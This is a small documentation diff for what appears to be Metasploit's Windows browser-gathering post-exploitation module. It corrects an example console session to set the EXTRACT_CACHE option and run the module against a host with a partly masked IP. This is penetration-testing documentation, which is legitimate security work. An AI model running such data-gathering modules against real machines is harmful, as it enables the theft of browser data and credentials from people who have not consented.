@@ -204,8 +204,8 @@ This will kill any running browser processes and avoid file access issues.
 Extract browser cache (may take a long time). It is recommended to set `KILL_BROWSER` to `true` for best results, as this prevents file access issues.
 
 ```bash
-msf6 post(windows/gather/enum_browsers) > set KILL_BROWSER true
-KILL_BROWSER => true
+msf6 post(windows/gather/enum_browsers) > set EXTRACT_CACHE true
+EXTRACT_CACHE => true
 msf6 post(windows/gather/enum_browsers) > run
 
 [*] Targeting: W00T\ah (IP: 178.238.175.xxx)
